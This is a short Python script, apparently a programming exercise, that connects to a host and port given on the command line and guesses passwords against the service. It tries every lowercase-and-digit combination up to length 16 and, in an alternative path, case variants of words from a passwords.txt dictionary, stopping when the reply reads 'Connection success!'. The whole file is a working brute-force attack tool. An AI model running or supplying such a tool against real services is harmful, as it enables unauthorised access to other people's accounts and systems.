import itertools
import socket
import sys
import os
import string
from typing import Iterable, Generator

HOST = sys.argv[1]
PORT = int(sys.argv[2])
ADDRESS = (HOST, PORT)


class TxtReader:
    def __init__(self, file_path: str):
        self.file = file_path

    def read(self) -> str:
        with open(self.file) as f:
            for line in f:
                yield line.strip()


def brute_force(charset: Iterable, minlength: int, maxlength: int) -> Generator:
    """Takes an iterable object with a sequence of possible characters.
        Minimum and maximum combination length.
        Returns a generator that will sort all possible combinations"""
    for length in range(minlength, maxlength + 1):
        for char in itertools.product(charset, repeat=length):
            yield ''.join(char)


def generate_typical_passwords(password: str) -> str:
    password_chars = [{char.upper(), char.lower()} for char in password]  # set
    for pwd in itertools.product(*password_chars):
        yield ''.join(pwd)


def send_data(connection, password: str, success_message: str = 'Connection success!') -> bool:
    """Takes the connection, generator, and message that is expected to be received on success.
        Sends the elements generated by the generator to the connection, listens for the response,
        when it receives a success message in response, returns the generated object."""
    encoded_password = password.encode()
    try:
        connection.send(encoded_password)
        response = connection.recv(1024)
        response = response.decode()
        if response == success_message:
            return True
    except ConnectionAbortedError:
        pass

    return False


def main_brute_force():
    charset = string.ascii_lowercase + string.digits
    password_generator = brute_force(charset, 1, 16)

    with socket.socket() as connection:
        connection.connect(ADDRESS)
        for password in password_generator:
            correct_password = send_data(connection, password)
            if correct_password:
                print(password)
                break


def main_typical_passwords():
    passwords = TxtReader(os.path.join(os.path.dirname(os.path.abspath(__file__))) + "\passwords.txt").read()
    with socket.socket() as connection:
        connection.connect(ADDRESS)
        for pwd in passwords:
            password_generator = generate_typical_passwords(pwd)
            for password in password_generator:
                correct_password = send_data(connection, password)
                if correct_password:
                    print(password)
                    break


if __name__ == '__main__':
    main_brute_force()
    # main_typical_passwords()
